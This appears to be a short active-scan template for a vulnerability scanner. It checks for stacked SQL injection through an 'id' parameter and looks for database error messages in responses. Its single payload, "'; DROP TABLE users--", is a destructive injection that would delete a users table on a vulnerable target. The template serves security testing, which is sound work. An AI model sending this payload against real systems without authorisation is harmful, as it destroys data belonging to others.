id: sqli2-stacked-05
name: 'SQLi stacked via id'
severity: critical
type: active
tags:
  - sqli
  - injection
  - stacked
description: 'Extra SQL statement via id'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      id:
        - '''; DROP TABLE users--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'SQL syntax'
          - 'mysql_fetch'
          - 'PostgreSQL'
          - 'ODBC'
          - 'ORA-'
          - 'SQLite'
